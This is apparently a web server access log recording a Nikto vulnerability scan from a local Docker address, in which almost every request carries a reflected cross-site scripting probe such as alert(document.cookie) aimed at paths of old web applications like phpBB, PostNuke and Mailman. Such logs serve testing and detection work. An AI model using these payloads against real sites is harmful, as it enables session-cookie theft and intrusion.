172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /admin/sh_taskframes.asp?Title=Configuraci%C3%B3n%20de%20registro%20Web&URL=MasterSettings/Web_LogSettings.asp?tab1=TabsWebServer%26tab2=TabsWebLogSettings%26__SAPageKey=5742D5874845934A134CD05F39C63240&ReturnURL=\\\"><script>alert(document.cookie)</script> HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000733)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /SiteServer/Knowledge/Default.asp?ctr=\\\"><script>alert('Vulnerable')</script> HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000734)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /_mem_bin/formslogin.asp?\\\"><script>alert('Vulnerable')</script> HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000735)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /nosuchurl/><script>alert('Vulnerable')</script> HTTP/1.1" 404 553 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000736)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /test.php?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000737)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /test.shtml?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000738)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /search/results.stm?query=&lt;script&gt;alert('vulnerable');&lt;/script&gt; HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000740)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /webcalendar/week.php?eventinfo=<script>alert(document.cookie)</script> HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000741)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /~/<script>alert('Vulnerable')</script>.aspx?aspxerrorpath=null HTTP/1.1" 404 546 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000767)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /~/<script>alert('Vulnerable')</script>.aspx HTTP/1.1" 404 546 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000768)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /~/<script>alert('Vulnerable')</script>.asp HTTP/1.1" 404 545 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000769)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /z_user_show.php?method=showuserlink&class=<Script>javascript:alert(document.cookie)</Script>&rollid=admin&x=3da59a9da8825& HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000770)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /catinfo?<u><b>TESTING HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000771)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /webchat/register.php?register=yes&username=OverG&email=<script>alert%20(\\\"Vulnerable\\\")</script>&email1=<script>alert%20(\\\"Vulnerable\\\")</script> HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000772)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /webamil/test.php HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000773)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /users.php?mode=profile&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt; HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000774)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /usercp.php?function=avataroptions:javascript:alert(%27Vulnerable%27) HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000775)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /user.php?op=userinfo&uname=<script>alert('hi');</script> HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000776)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /TopSitesdirectory/help.php?sid=&lt;script&gt;alert(document.cookie)&lt;/script&gt; HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000779)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /templates/form_header.php?noticemsg=<script>javascript:alert(document.cookie)</script> HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000780)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /templates/form_header.php?noticemsg=<script>javascript:alert(document.cookie)</script> HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000781)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /supporter/index.php?t=updateticketlog&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt; HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000782)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /supporter/index.php?t=tickettime&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt; HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000783)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /supporter/index.php?t=ticketfiles&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt; HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000784)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /sunshop.index.php?action=storenew&username=<script>alert('Vulnerable')</script> HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000785)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /submit.php?subject=<script>alert('Vulnerable')</script>&story=<script>alert('Vulnerable')</script>&storyext=<script>alert('Vulnerable')</script>&op=Preview HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000786)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /ss000007.pl?PRODREF=<script>alert('Vulnerable')</script> HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000787)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /showcat.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt; HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000788)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /shop/normal_html.cgi?file=&lt;script&gt;alert(\\\"Vulnerable\\\")&lt;/script&gt; HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000789)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /setup.exe?<script>alert('Vulnerable')</script>&page=list_users&user=P HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000790)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "POST /servlet/custMsg?guestName=<script>alert(\\\"Vulnerable\\\")</script> HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000791)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "POST /servlet/CookieExample?cookiename=<script>alert(\\\"Vulnerable\\\")</script> HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000792)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /servlet/ContentServer?pagename=<script>alert('Vulnerable')</script> HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000793)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /search/index.cfm?<script>alert(\\\"Vulnerable\\\")</script> HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000794)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /search/?SectionIDOverride=1&SearchText=<script>alert(document.cookie);</script> HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000795)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /search.php?zoom_query=<script>alert(\\\"hello\\\")</script> HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000796)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /search.php?searchstring=<script>alert(document.cookie)</script> HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000797)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /search.php?searchfor=\\\"><script>alert(1776)</script> HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000798)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /search.asp?term=<%00script>alert('Vulnerable')</script> HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000799)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /script>alert('Vulnerable')</script>.cfm HTTP/1.1" 404 539 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000800)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /samples/search.dll?query=<script>alert(document.cookie)</script> HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000801)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /replymsg.php?send=1&destin=<script>alert('Vulnerable')</script> HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000802)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /profiles.php?uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt; HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000803)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /postnuke/modules.php?op=modload&name=Web_Links&file=index&req=viewlinkdetails&lid=666&ttitle=Mocosoft Utilities\\\"%3<script>alert('Vulnerable')</script>" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /postnuke/html/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script> HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000805)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /pm_buddy_list.asp?name=A&desc=B%22%3E<script>alert('Vulnerable')</script>%3Ca%20s=%22&code=1 HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000806)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /pms.php?action=send&recipient=DESTINATAIRE&subject=happy&posticon=javascript:alert('Vulnerable')&mode=0&message=Hello HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000807)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /pm.php?function=sendpm&to=VICTIM&subject=SUBJECT&images=javascript:alert('Vulnerable')&message=MESSAGE&submitpm=Submit HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000808)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpwebsite/index.php?module=search&SEA_search_op=continue&PDA_limit=10\\\"><script>alert('Vulnerable')</script> HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000809)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpwebsite/index.php?module=pagemaster&PAGE_user_op=view_page&PAGE_id=10\\\"><script>alert('Vulnerable')</script>&MMN_position=[X:X] HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000810)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpwebsite/index.php?module=fatcat&fatcat[user]=viewCategory&fatcat_id=1%00+\\\"><script>alert('Vulnerable')</script> HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000811)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpwebsite/index.php?module=calendar&calendar[view]=day&month=2&year=2003&day=1+%00\\\"><script>alert('Vulnerable')</script> HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000812)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpwebchat/register.php?register=yes&username=OverG&email=<script>alert%20(\\\"Vulnerable\\\")</script>&email1=<script>alert%20(\\\"Vulnerable\\\")</script> HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000813)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phptonuke.php?filnavn=<script>alert('Vulnerable')</script> HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000814)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phprank/add.php?page=add&spass=1&name=2&siteurl=3&email=%3Cscript%3Ealert(Vulnerable)%3C/script%3E HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000815)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script> HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000816)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpinfo.php3?VARIABLE=<script>alert('Vulnerable')</script> HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000817)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpimageview.php?pic=javascript:alert(8754) HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000818)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpclassifieds/latestwap.php?url=<script>alert('Vulnerable');</script> HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000819)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpBB/viewtopic.php?topic_id=<script>alert('Vulnerable')</script> HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000820)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpBB/viewtopic.php?t=17071&highlight=\\\">\\\"<script>javascript:alert(document.cookie)</script> HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000821)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phorum/admin/header.php?GLOBALS[message]=<script>alert('Vulnerable')</script> HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000822)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phorum/admin/footer.php?GLOBALS[message]=<script>alert('Vulnerable')</script> HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000823)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /pages/htmlos/%3Cscript%3Ealert('Vulnerable');%3C/script%3E HTTP/1.1" 404 553 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000825)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /Page/1,10966,,00.html?var=<script>alert('Vulnerable')</script> HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000826)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /openautoclassifieds/friendmail.php?listing=<script>alert(document.domain);</script> HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000827)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /openautoclassifieds/friendmail.php?listing=&lt;script&gt;alert(document.domain);&lt;/script&gt; HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000828)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /node/view/666\\\"><script>alert(document.domain)</script> HTTP/1.1" 404 566 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000829)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /netutils/whodata.stm?sitename=<script>alert(document.cookie)</script> HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000830)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /nav/cList.php?root=</script><script>alert('Vulnerable')/<script> HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000831)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /myphpnuke/links.php?op=search&query=[script]alert('Vulnerable);[/script]?query= HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000832)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /myphpnuke/links.php?op=search&query=[script]alert('Vulnerable);[/script]?query= HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000833)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /myphpnuke/links.php?op=MostPopular&ratenum=[script]alert(document.cookie);[/script]&ratetype=percent HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000834)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /myphpnuke/links.php?op=MostPopular&ratenum=[script]alert(document.cookie);[/script]&ratetype=percent HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000835)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /myhome.php?action=messages&box=<script>alert('Vulnerable')</script> HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000836)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /msadm/user/login.php3?account_name=\\\"><script>alert('Vulnerable')</script> HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000837)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /msadm/site/index.php3?authid=\\\"><script>alert('Vulnerable')</script> HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000838)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /msadm/domain/index.php3?account_name=\\\"><script>alert('Vulnerable')</script> HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000839)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules/Submit/index.php?op=pre&title=<script>alert(document.cookie);</script> HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000840)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules/Forums/bb_smilies.php?site_font=}--></style><script>alert('Vulnerable')</script> HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000841)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules/Forums/bb_smilies.php?name=<script>alert('Vulnerable')</script> HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000842)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules/Forums/bb_smilies.php?Default_Theme=<script>alert('Vulnerable')</script> HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000843)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules/Forums/bb_smilies.php?bgcolor1=\\\"><script>alert('Vulnerable')</script> HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000844)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules.php?op=modload&name=Xforum&file=member&action=viewpro&member=<script>alert('Vulnerable')</script> HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000845)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules.php?op=modload&name=Xforum&file=<script>alert('Vulnerable')</script>&fid=2 HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000846)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules.php?op=modload&name=Wiki&file=index&pagename=<script>alert('Vulnerable')</script> HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000847)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules.php?op=modload&name=Web_Links&file=index&l_op=viewlink&cid=<script>alert('Vulnerable')</script> HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000848)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules.php?op=modload&name=WebChat&file=index&roomid=<script>alert('Vulnerable')</script> HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000849)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules.php?op=modload&name=Members_List&file=index&letter=<script>alert('Vulnerable')</script> HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000850)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules.php?op=modload&name=Guestbook&file=index&entry=<script>alert('Vulnerable')</script> HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000851)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules.php?op=modload&name=FAQ&file=index&myfaq=yes&id_cat=1&categories=%3Cimg%20src=javascript:alert(9456);%3E&parent_id=0 HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000852)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules.php?op=modload&name=DMOZGateway&file=index&topic=<script>alert('Vulnerable')</script> HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000853)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules.php?op=modload&name=books&file=index&req=search&query=|script|alert(document.cookie)|/script| HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000854)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules.php?name=Your_Account&op=userinfo&username=bla<script>alert(document.cookie)</script> HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000855)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules.php?name=Your_Account&op=userinfo&uname=<script>alert('Vulnerable')</script> HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000856)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules.php?name=Surveys&pollID=<script>alert('Vulnerable')</script> HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000857)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules.php?name=Stories_Archive&sa=show_month&year=<script>alert('Vulnerable')</script>&month=3&month_l=test HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000858)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules.php?name=Stories_Archive&sa=show_month&year=2002&month=03&month_l=<script>alert('Vulnerable')</script> HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000859)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules.php?name=Downloads&d_op=viewdownloaddetails&lid=02&ttitle=<script>alert('Vulnerable')</script> HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000860)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules.php?name=Classifieds&op=ViewAds&id_subcatg=75&id_catg=<script>alert('Vulnerable')</script> HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000861)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules.php?letter=%22%3E%3Cimg%20src=javascript:alert(document.cookie);%3E&op=modload&name=Members_List&file=index HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000862)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /members.asp?SF=%22;}alert(223344);function%20x(){v%20=%22 HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000863)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /megabook/admin.cgi?login=<script>alert('Vulnerable')</script> HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000864)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /mailman/options/yourlist?language=en&email=&lt;SCRIPT&gt;alert('Vulnerable')&lt;/SCRIPT&gt; HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000865)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /mailman/listinfo/<script>alert('Vulnerable')</script> HTTP/1.1" 404 556 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000866)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /ldap/cgi-bin/ldacgi.exe?Action=<script>alert(\\\"Vulnerable\\\")</script> HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000867)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /launch.jsp?NFuse_Application=<script>alert('Vulnerable')</script> HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000868)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /launch.asp?NFuse_Application=<script>alert('Vulnerable')</script> HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000869)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /jigsaw/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000870)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /isapi/testisa.dll?check1=<script>alert(document.cookie)</script> HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000872)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?top_message=&lt;script&gt;alert(document.cookie)&lt;/script&gt; HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?file=Liens&op=\\\"><script>alert('Vulnerable');</script> HTTP/1.1" 302 479 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000874)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?catid=&lt;script&gt;alert('Vulnerable')&lt;/script&gt; HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000875)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?action=storenew&username=<script>alert('Vulnerable')</script> HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000876)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?action=search&searchFor=\\\"><script>alert('Vulnerable')</script >" 400 0 "-" "-"
